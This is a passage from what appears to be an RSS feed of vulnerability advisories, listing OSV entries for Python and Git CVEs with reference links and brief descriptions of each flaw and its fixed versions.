href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/N6VXJZSZ6N64AILJX4CTMACYGQGHHD5C/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/N6VXJZSZ6N64AILJX4CTMACYGQGHHD5C/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/NJSCSN722JO2E2AGPWD4NTGVELVRPB4R/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/NJSCSN722JO2E2AGPWD4NTGVELVRPB4R/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/NODWHDIFBQE5RU5PUWUVE47JOT5VCMJ2/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/NODWHDIFBQE5RU5PUWUVE47JOT5VCMJ2/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/OAGSWNGZJ6HQ5ISA67SNMK3CJRKICET7/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/OAGSWNGZJ6HQ5ISA67SNMK3CJRKICET7/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/RSLQD5CCM75IZGAMBDGUZEATYU5YSGJ7/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/RSLQD5CCM75IZGAMBDGUZEATYU5YSGJ7/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/SGIY6I4YS3WOXAK4SXKIEOC2G4VZKIR7/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/SGIY6I4YS3WOXAK4SXKIEOC2G4VZKIR7/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TFTELUMWZE3KV3JB2H5EE6VFRZFRD5MV/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TFTELUMWZE3KV3JB2H5EE6VFRZFRD5MV/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/W2LSKBEFI5SYEY5FM6ICZVZM5WRQUCS4/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/W2LSKBEFI5SYEY5FM6ICZVZM5WRQUCS4/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202104-04'>https://security.gentoo.org/glsa/202104-04</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210326-0004/'>https://security.netapp.com/advisory/ntap-20210326-0004/</a></li><li>- <a target='_blank' href='https://snyk.io/blog/cache-poisoning-in-popular-open-source-packages/'>https://snyk.io/blog/cache-poisoning-in-popular-open-source-packages/</a></li><li>- <a target='_blank' href='https://snyk.io/vuln/SNYK-UPSTREAM-PYTHONCPYTHON-1074933'>https://snyk.io/vuln/SNYK-UPSTREAM-PYTHONCPYTHON-1074933</a></li><li>- <a target='_blank' href='https://www.oracle.com//security-alerts/cpujul2021.html'>https://www.oracle.com//security-alerts/cpujul2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuApr2021.html'>https://www.oracle.com/security-alerts/cpuApr2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujan2022.html'>https://www.oracle.com/security-alerts/cpujan2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuoct2021.html'>https://www.oracle.com/security-alerts/cpuoct2021.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>The package python&#x2F;cpython from 0 and before 3.6.13, from 3.7.0 and before 3.7.10, from 3.8.0 and before 3.8.8, from 3.9.0 and before 3.9.2 are vulnerable to Web Cache Poisoning via urllib.parse.parse_qsl and urllib.parse.parse_qs by using a vector called parameter cloaking. When the attacker can separate query parameters using a semicolon (;), they can cause a difference in the interpretation of the request between the proxy (running with default configuration) and the server. This can result in malicious requests being cached as completely safe ones, as the proxy would usually not see the semicolon as a separator, and therefore would not include it in a cache key of an unkeyed parameter.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2021-29921: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2021-29921</link>
                    <pubDate>2025-01-16T07:23:24.706Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2021-29921'>https://osv.dev/vulnerability/BIT-python-min-2021-29921</a><br>
                            <b>Published:</b> 2025-01-16T07:23:24.706Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.python.org/issue36384'>https://bugs.python.org/issue36384</a></li><li>- <a target='_blank' href='https://docs.python.org/3/library/ipaddress.html'>https://docs.python.org/3/library/ipaddress.html</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/blob/63298930fb531ba2bb4f23bc3b915dbf1e17e9e1/Misc/NEWS.d/3.8.0a4.rst'>https://github.com/python/cpython/blob/63298930fb531ba2bb4f23bc3b915dbf1e17e9e1/Misc/NEWS.d/3.8.0a4.rst</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/12577'>https://github.com/python/cpython/pull/12577</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/25099'>https://github.com/python/cpython/pull/25099</a></li><li>- <a target='_blank' href='https://github.com/sickcodes'>https://github.com/sickcodes</a></li><li>- <a target='_blank' href='https://github.com/sickcodes/security/blob/master/advisories/SICK-2021-014.md'>https://github.com/sickcodes/security/blob/master/advisories/SICK-2021-014.md</a></li><li>- <a target='_blank' href='https://python-security.readthedocs.io/vuln/ipaddress-ipv4-leading-zeros.html'>https://python-security.readthedocs.io/vuln/ipaddress-ipv4-leading-zeros.html</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202305-02'>https://security.gentoo.org/glsa/202305-02</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210622-0003/'>https://security.netapp.com/advisory/ntap-20210622-0003/</a></li><li>- <a target='_blank' href='https://sick.codes/sick-2021-014'>https://sick.codes/sick-2021-014</a></li><li>- <a target='_blank' href='https://www.oracle.com//security-alerts/cpujul2021.html'>https://www.oracle.com//security-alerts/cpujul2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuapr2022.html'>https://www.oracle.com/security-alerts/cpuapr2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujan2022.html'>https://www.oracle.com/security-alerts/cpujan2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujul2022.html'>https://www.oracle.com/security-alerts/cpujul2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuoct2021.html'>https://www.oracle.com/security-alerts/cpuoct2021.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In Python before 3,9,5, the ipaddress library mishandles leading zero characters in the octets of an IP address string. This (in some situations) allows attackers to bypass access control that is based on IP addresses.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2022-37454: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2022-37454</link>
                    <pubDate>2025-01-16T07:22:28.692Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2022-37454'>https://osv.dev/vulnerability/BIT-python-min-2022-37454</a><br>
                            <b>Published:</b> 2025-01-16T07:22:28.692Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://csrc.nist.gov/projects/hash-functions/sha-3-project'>https://csrc.nist.gov/projects/hash-functions/sha-3-project</a></li><li>- <a target='_blank' href='https://eprint.iacr.org/2023/331'>https://eprint.iacr.org/2023/331</a></li><li>- <a target='_blank' href='https://github.com/XKCP/XKCP/security/advisories/GHSA-6w4m-2xhg-2658'>https://github.com/XKCP/XKCP/security/advisories/GHSA-6w4m-2xhg-2658</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2022/10/msg00041.html'>https://lists.debian.org/debian-lts-announce/2022/10/msg00041.html</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2022/11/msg00000.html'>https://lists.debian.org/debian-lts-announce/2022/11/msg00000.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/3ALQ6BDDPX5HU5YBQOBMDVAA2TSGDKIJ/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/3ALQ6BDDPX5HU5YBQOBMDVAA2TSGDKIJ/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/CMIEXLMTW5GO36HTFFWIPB3OHZXCT3G4/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/CMIEXLMTW5GO36HTFFWIPB3OHZXCT3G4/</a></li><li>- <a target='_blank' href='https://mouha.be/sha-3-buffer-overflow/'>https://mouha.be/sha-3-buffer-overflow/</a></li><li>- <a target='_blank' href='https://news.ycombinator.com/item?id=33281106'>https://news.ycombinator.com/item?id=33281106</a></li><li>- <a target='_blank' href='https://news.ycombinator.com/item?id=35050307'>https://news.ycombinator.com/item?id=35050307</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202305-02'>https://security.gentoo.org/glsa/202305-02</a></li><li>- <a target='_blank' href='https://www.debian.org/security/2022/dsa-5267'>https://www.debian.org/security/2022/dsa-5267</a></li><li>- <a target='_blank' href='https://www.debian.org/security/2022/dsa-5269'>https://www.debian.org/security/2022/dsa-5269</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20230203-0001/'>https://security.netapp.com/advisory/ntap-20230203-0001/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>The Keccak XKCP SHA-3 reference implementation before fdc6fef has an integer overflow and resultant buffer overflow that allows attackers to execute arbitrary code or eliminate expected cryptographic properties. This occurs in the sponge function interface.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2022-42919: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2022-42919</link>
                    <pubDate>2025-01-16T07:22:21.502Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2022-42919'>https://osv.dev/vulnerability/BIT-python-min-2022-42919</a><br>
                            <b>Published:</b> 2025-01-16T07:22:21.502Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/python/cpython/compare/v3.10.8...v3.10.9'>https://github.com/python/cpython/compare/v3.10.8...v3.10.9</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/compare/v3.9.15...v3.9.16'>https://github.com/python/cpython/compare/v3.9.15...v3.9.16</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/97514'>https://github.com/python/cpython/issues/97514</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/97514#issuecomment-1310277840'>https://github.com/python/cpython/issues/97514#issuecomment-1310277840</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/FKGCQPIVHEAIJ77R3RSNSQWYBUDVWDKU/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/FKGCQPIVHEAIJ77R3RSNSQWYBUDVWDKU/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/P2LHWWEI5OBQ6RELULMVU6KMDYG4WZXH/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/P2LHWWEI5OBQ6RELULMVU6KMDYG4WZXH/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PI5DYIED6U26BGX5IRZWNCP6TY4M2ZGZ/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PI5DYIED6U26BGX5IRZWNCP6TY4M2ZGZ/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/QLUGZSEAO3MBWGKCUSMKQIRYJZKJCIOB/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/QLUGZSEAO3MBWGKCUSMKQIRYJZKJCIOB/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/R6KGIRHSENZ4QAB234Z36HVIDTRJ3MFI/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/R6KGIRHSENZ4QAB234Z36HVIDTRJ3MFI/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/RDK3ZZBRYFO47ET3N4BNTKVXN47U6ICY/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/RDK3ZZBRYFO47ET3N4BNTKVXN47U6ICY/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/VCRKBB5Y5EWTJUNC7LK665WO64DDXSTN/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/VCRKBB5Y5EWTJUNC7LK665WO64DDXSTN/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/XX6LLAXGZVZ327REY6MDZRMMP47LJ53P/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/XX6LLAXGZVZ327REY6MDZRMMP47LJ53P/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202305-02'>https://security.gentoo.org/glsa/202305-02</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20221209-0006/'>https://security.netapp.com/advisory/ntap-20221209-0006/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Python 3.9.x before 3.9.16 and 3.10.x before 3.10.9 on Linux allows local privilege escalation in a non-default configuration. The Python multiprocessing library, when used with the forkserver start method on Linux, allows pickles to be deserialized from any user in the same machine local network namespace, which in many system configurations means any user on the same machine. Pickles can execute arbitrary code. Thus, this allows for local user privilege escalation to the user that any forkserver process is running as. Setting multiprocessing.util.abstract_sockets_supported to False is a workaround. The forkserver start method for multiprocessing is not the default start method. This issue is Linux specific because only Linux supports abstract namespace sockets. CPython before 3.9 does not make use of Linux abstract namespace sockets by default. Support for users manually specifying an abstract namespace socket was added as a bugfix in 3.7.8 and 3.8.3, but users would need to make specific uncommon API calls in order to do that in CPython before 3.9.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2023-24329: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2023-24329</link>
                    <pubDate>2025-01-16T07:21:41.202Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2023-24329'>https://osv.dev/vulnerability/BIT-python-min-2023-24329</a><br>
                            <b>Published:</b> 2025-01-16T07:21:41.202Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/python/cpython/issues/102153'>https://github.com/python/cpython/issues/102153</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/99421'>https://github.com/python/cpython/pull/99421</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2023/09/msg00022.html'>https://lists.debian.org/debian-lts-announce/2023/09/msg00022.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6PEVICI7YNGGMSL3UCMWGE66QFLATH72/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6PEVICI7YNGGMSL3UCMWGE66QFLATH72/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/DSL6NSOAXWBJJ67XPLSSC74MNKZF3BBO/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/DSL6NSOAXWBJJ67XPLSSC74MNKZF3BBO/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/EM2XLZSTXG44TMFXF4E6VTGKR2MQCW3G/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/EM2XLZSTXG44TMFXF4E6VTGKR2MQCW3G/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/F2NY75GFDZ5T6YPN44D3VMFT5SUVTOTG/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/F2NY75GFDZ5T6YPN44D3VMFT5SUVTOTG/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/GR5US3BYILYJ4SKBV6YBNPRUBAL5P2CN/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/GR5US3BYILYJ4SKBV6YBNPRUBAL5P2CN/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/H23OSKC6UG6IWOQAUPW74YUHWRWVXJP7/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/H23OSKC6UG6IWOQAUPW74YUHWRWVXJP7/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/JZTLGV2HYFF4AMYJL25VDIGAIHCU7UPA/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/JZTLGV2HYFF4AMYJL25VDIGAIHCU7UPA/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/LWC4WGXER5P6Q75RFGL7QUTPP3N5JR7T/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/LWC4WGXER5P6Q75RFGL7QUTPP3N5JR7T/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/MZEHSXSCMA4WWQKXT6QV7AAR6SWNZ2VP/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/MZEHSXSCMA4WWQKXT6QV7AAR6SWNZ2VP/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/O5SP4RT3RRS434ZS2HQKQJ3VZW7YPKYR/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/O5SP4RT3RRS434ZS2HQKQJ3VZW7YPKYR/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/OHHJHJRLEF3TDT2K3676CAUVRDD4CCMR/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/OHHJHJRLEF3TDT2K3676CAUVRDD4CCMR/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PEUN6T22UJFXR7J5F6UUHCXXPKJ2DVHI/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PEUN6T22UJFXR7J5F6UUHCXXPKJ2DVHI/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PURM5CFDABEWAIWZFD2MQ7ZJGCPYSQ44/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PURM5CFDABEWAIWZFD2MQ7ZJGCPYSQ44/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/Q3J5N24ECS4B6MJDRO6UAYU6GPLYBDCL/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/Q3J5N24ECS4B6MJDRO6UAYU6GPLYBDCL/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/QRQHN7RWJQJHYP6E5EKESOYP5VDSHZG4/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/QRQHN7RWJQJHYP6E5EKESOYP5VDSHZG4/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/RA2MBEEES6L46OD64OBSVUUMGKNGMOWW/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/RA2MBEEES6L46OD64OBSVUUMGKNGMOWW/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/T4IDB5OAR5Y4UK3HLMZBW4WEL2B7YFMJ/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/T4IDB5OAR5Y4UK3HLMZBW4WEL2B7YFMJ/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TZH26JGNZ5XYPZ5SAU3NKSBSPRE5OHTG/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TZH26JGNZ5XYPZ5SAU3NKSBSPRE5OHTG/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/U2MZOJYGFCB5PPT6AKMAU72N7QOYWLBP/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/U2MZOJYGFCB5PPT6AKMAU72N7QOYWLBP/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/UONZWLB4QVLQIY5CPDLEUEKH6WX4VQMC/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/UONZWLB4QVLQIY5CPDLEUEKH6WX4VQMC/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/WTOAUJNDWZDRWVSXJ354AYZYKRMT56HU/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/WTOAUJNDWZDRWVSXJ354AYZYKRMT56HU/</a></li><li>- <a target='_blank' href='https://pointernull.com/security/python-url-parse-problem.html'>https://pointernull.com/security/python-url-parse-problem.html</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20230324-0004/'>https://security.netapp.com/advisory/ntap-20230324-0004/</a></li><li>- <a target='_blank' href='https://www.kb.cert.org/vuls/id/127587'>https://www.kb.cert.org/vuls/id/127587</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue in the urllib.parse component of Python before 3.11.4 allows attackers to bypass blocklisting methods by supplying a URL that starts with blank characters.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2023-33595: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2023-33595</link>
                    <pubDate>2025-01-16T07:21:27.893Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2023-33595'>https://osv.dev/vulnerability/BIT-python-min-2023-33595</a><br>
                            <b>Published:</b> 2025-01-16T07:21:27.893Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/python/cpython/issues/103824'>https://github.com/python/cpython/issues/103824</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/103993/commits/c120bc2d354ca3d27d0c7a53bf65574ddaabaf3a'>https://github.com/python/cpython/pull/103993/commits/c120bc2d354ca3d27d0c7a53bf65574ddaabaf3a</a></li></ul><br>
                            <b>Details:</b> <b></b><br>CPython v3.12.0 alpha 7 was discovered to contain a heap use-after-free via the function ascii_decode at &#x2F;Objects&#x2F;unicodeobject.c.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2023-36632: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2023-36632</link>
                    <pubDate>2025-01-16T07:21:21.100Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2023-36632'>https://osv.dev/vulnerability/BIT-python-min-2023-36632</a><br>
                            <b>Published:</b> 2025-01-16T07:21:21.100Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://docs.python.org/3/library/email.html'>https://docs.python.org/3/library/email.html</a></li><li>- <a target='_blank' href='https://docs.python.org/3/library/email.utils.html'>https://docs.python.org/3/library/email.utils.html</a></li><li>- <a target='_blank' href='https://github.com/Daybreak2019/PoC_python3.9_Vul/blob/main/RecursionError-email.utils.parseaddr.py'>https://github.com/Daybreak2019/PoC_python3.9_Vul/blob/main/RecursionError-email.utils.parseaddr.py</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/103800'>https://github.com/python/cpython/issues/103800</a></li></ul><br>
                            <b>Details:</b> <b></b><br>The legacy email.utils.parseaddr function in Python through 3.11.4 allows attackers to trigger &quot;RecursionError: maximum recursion depth exceeded while calling a Python object&quot; via a crafted argument. This argument is plausibly an untrusted value from an application&#x27;s input data that was supposed to contain a name and an e-mail address. NOTE: email.utils.parseaddr is categorized as a Legacy API in the documentation of the Python email package. Applications should instead use the email.parser.BytesParser or email.parser.Parser class. NOTE: the vendor&#x27;s perspective is that this is neither a vulnerability nor a bug. The email package is intended to have size limits and to throw an exception when limits are exceeded; they were exceeded by the example demonstration code.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-git-2024-50349: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-git-2024-50349</link>
                    <pubDate>2025-01-16T07:10:18.504Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-git-2024-50349'>https://osv.dev/vulnerability/BIT-git-2024-50349</a><br>
                            <b>Published:</b> 2025-01-16T07:10:18.504Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/git/git/commit/7725b8100ffbbff2750ee4d61a0fcc1f53a086e8'>https://github.com/git/git/commit/7725b8100ffbbff2750ee4d61a0fcc1f53a086e8</a></li><li>- <a target='_blank' href='https://github.com/git/git/commit/c903985bf7e772e2d08275c1a95c8a55ab011577'>https://github.com/git/git/commit/c903985bf7e772e2d08275c1a95c8a55ab011577</a></li><li>- <a target='_blank' href='https://github.com/git/git/security/advisories/GHSA-hmg8-h7qf-7cxr'>https://github.com/git/git/security/advisories/GHSA-hmg8-h7qf-7cxr</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Git is a fast, scalable, distributed revision control system with an unusually rich command set that provides both high-level operations and full access to internals. When Git asks for credentials via a terminal prompt (i.e. without using any credential helper), it prints out the host name for which the user is expected to provide a username and&#x2F;or a password. At this stage, any URL-encoded parts have been decoded already, and are printed verbatim. This allows attackers to craft URLs that contain ANSI escape sequences that the terminal interpret to confuse users e.g. into providing passwords for trusted Git hosting sites when in fact they are then sent to untrusted sites that are under the attacker&#x27;s control. This issue has been patch via commits `7725b81` and `c903985` which are included in release versions v2.48.1, v2.47.2, v2.46.3, v2.45.3, v2.44.3, v2.43.6, v2.42.4, v2.41.3, and v2.40.4. Users are advised to upgrade. Users unable to upgrade should avoid cloning from untrusted URLs, especially recursive clones.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-git-2024-52006: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-git-2024-52006</link>
                    <pubDate>2025-01-16T07:10:11.182Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-git-2024-52006'>https://osv.dev/vulnerability/BIT-git-2024-52006</a><br>
                            <b>Published:</b> 2025-01-16T07:10:11.182Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/git-ecosystem/git-credential-manager/security/advisories/GHSA-86c2-4x57-wc8g'>https://github.com/git-ecosystem/git-credential-manager/security/advisories/GHSA-86c2-4x57-wc8g</a></li><li>- <a target='_blank' href='https://github.com/git/git/commit/b01b9b81d36759cdcd07305e78765199e1bc2060'>https://github.com/git/git/commit/b01b9b81d36759cdcd07305e78765199e1bc2060</a></li><li>- <a target='_blank' href='https://github.com/git/git/security/advisories/GHSA-qm7j-c969-7j4q'>https://github.com/git/git/security/advisories/GHSA-qm7j-c969-7j4q</a></li><li>- <a target='_blank' href='https://github.com/git/git/security/advisories/GHSA-r5ph-xg7q-xfrp'>https://github.com/git/git/security/advisories/GHSA-r5ph-xg7q-xfrp</a></li></ul><br>
